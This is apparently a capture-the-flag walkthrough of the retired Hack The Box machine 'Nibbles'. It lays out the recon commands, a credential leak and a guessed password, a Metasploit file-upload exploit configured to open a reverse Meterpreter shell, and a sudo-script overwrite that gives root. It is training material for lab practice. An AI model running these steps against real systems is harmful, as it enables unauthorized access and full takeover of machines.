**Nibbles** is a retired **Easy** Linux box on Hack The Box. On paper it's
simple — a single vulnerable web application gets you a foothold, and one sloppy
`sudo` rule gets you root — but it's a great box for practicing the mindset that
actually matters: reading what the target *tells* you and not skipping
enumeration steps. The foothold hinges on a comment left in the page source and
a password you have to guess, and the privilege escalation is a textbook
writable-script-run-as-root misconfiguration.

- **Target:** `10.129.60.224` (IP varies per spawn — recon shots show `10.129.83.140`)
- **OS:** Linux (Ubuntu 16.04, Apache 2.4.18)
- **Difficulty:** Easy

---

## Recon

### Port scan

Standard full TCP scan with service/version detection and default scripts:

```bash
nmap -sV -sC -oA nibbles.txt -p- --min-rate 1000 10.129.83.140
```

![Nmap scan results for Nibbles](nibbles_nmap_scan.png)
_Only two ports open: SSH and HTTP._

Two ports, nothing exotic:

- **22/tcp** — OpenSSH 7.2p2 (Ubuntu)
- **80/tcp** — Apache httpd 2.4.18 (Ubuntu)

SSH without credentials is a dead end this early, so the web server is the
obvious starting point.

### Poking at port 80

Browsing to the site gives us a very promising-looking application:

![Nibbles web root showing only Hello world](webpage.png)
_"Hello world!" — that's the entire page._

Not much to look at. Whenever a page is this bare, the next move is always to
check the source — developers leave things in HTML comments constantly.

```bash
view-source:http://10.129.83.140/
```

![Page source revealing the nibbleblog directory comment](nibbleblog_discovery.png)
_The comment points us straight at a hidden directory._

There it is:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

> Comments that say "nothing interesting here" are, in my experience, always
> interesting. This is exactly the kind of low-effort recon that separates a
> completed box from a stalled one — always view source on a sparse page.
{: .prompt-tip }

### Nibbleblog

Navigating to `/nibbleblog/` reveals a full blog application:

![Nibbleblog homepage titled Nibbles Yum yum](nibbleblog_webpage.png)
_A live Nibbleblog install — "Nibbles - Yum yum"._

Now we have a real target: a named CMS. Time to enumerate its structure.

### Directory brute-forcing

```bash
gobuster dir -u http://10.129.83.140/nibbleblog/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -t 50 -x txt,xml,php
```

![Gobuster results against the nibbleblog directory](nibbleblog_gobuster.png)
_admin.php, content/, install.php, and friends._

The useful hits are `admin.php` (the login panel) and `content/` — Nibbleblog
stores its data under `content/`, and by default that directory isn't locked
down.

### Enumerating the admin username

Nibbleblog keeps user data in a world-readable XML file. Requesting it directly
leaks the admin account:

```bash
http://10.129.83.140/nibbleblog/content/private/users.xml
```

![users.xml exposing the admin username](username_enumeration.png)
_`<user username="admin">` — half of our credentials, for free._

So the username is **`admin`**. The password isn't stored here in plaintext, but
given the box's theme ("Nibbles"), an educated guess of **`nibbles`** is worth a
shot — and it works. Confirming a guessed credential against the login panel
before firing an exploit saves you from debugging an "auth failed" error later.

## Foothold

### Finding the exploit

With a known CMS, `searchsploit` is the fastest way to check for public exploits:

```bash
searchsploit nibbleblog
```

![searchsploit output for nibbleblog](nibbleblog_exploit.png)
_Nibbleblog 4.0.3 — Arbitrary File Upload (Metasploit)._

The **Nibbleblog 4.0.3 Arbitrary File Upload** module is exactly what we need.
The version (4.0.3) matches what's disclosed in the app's README/version files.
The vulnerability lets an authenticated admin upload a "My image" plugin file
with no real validation — so we upload a PHP payload and get code execution.

### Firing the module

```bash
msfconsole
```

```text
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.60.224
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set LHOST tun0
set LPORT 4444
run
```

The module authenticates as admin, uploads a PHP payload disguised as an image,
cleans up the uploaded file behind itself (`Deleted image.php`), and drops a
Meterpreter session. A few things that trip people up here (they tripped me up):

> Set your options **after** `use`-ing the module. If you `set RHOSTS` at the
> bare `msf >` prompt before selecting a module, the value lands in the *global*
> datastore and won't reliably carry into the module. Always `use` first, then
> `set`, then `show options` to confirm everything's populated.
{: .prompt-warning }

> `TARGETURI` **must** be `/nibbleblog/`, not `/`. The module needs the path to
> the app, not the web root — leave this default and the exploit silently fails
> to find the login.
{: .prompt-info }

### Getting a real shell

Once the Meterpreter session opens, drop to a system shell and upgrade it to a
proper TTY:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> `shell` is a **Meterpreter** command, not a msfconsole command — it only works
> once you're inside an active session. Running it at the module prompt just
> throws "Unknown command."
{: .prompt-tip }

We land as the **`nibbler`** user.

## Privilege Escalation

First stop on any Linux box: check what we're allowed to run as root.

```bash
sudo -l
```

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This is the whole ballgame. We can run `monitor.sh` as root with no password —
and it lives **inside nibbler's own home directory**, which means we control it.

The `personal/` directory ships as a zip that needs unpacking first:

```bash
cd /home/nibbler
unzip personal.zip
ls -la personal/stuff/
```

Since we own the script, we just overwrite it with a shell:

```bash
echo '/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
```

Then execute it through `sudo`, using the **full path** exactly as it appears in
`sudo -l`:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

![Root shell obtained and root flag read](priv_esc_root_flag.png)
_`whoami` → root, and root.txt is ours._

> Run it with `sudo` **and** the full path. `./monitor.sh` just runs it as
> nibbler (no privilege gain), and `monitor.sh` alone fails because `.` isn't in
> your `$PATH`. The `sudo` rule is keyed to that exact absolute path — anything
> else won't trigger it.
{: .prompt-tip }

```bash
whoami          # root
cat /root/root.txt
```

Rooted.

## Takeaways

- **Read the page source.** The entire path forward was hidden in an HTML
  comment on an otherwise empty page. Sparse pages hide the most.
- **World-readable data files leak more than you'd think.** `users.xml` handed
  us the admin username with zero effort.
- **Guessing themed credentials is legitimate enumeration.** `admin` / `nibbles`
  wasn't a lucky break — it was a reasonable inference from the box's name.
- **`sudo -l` is always worth running.** A single NOPASSWD entry on a
  user-writable script is one of the most common Linux privesc paths, and it's
  trivial to weaponize once you spot it.
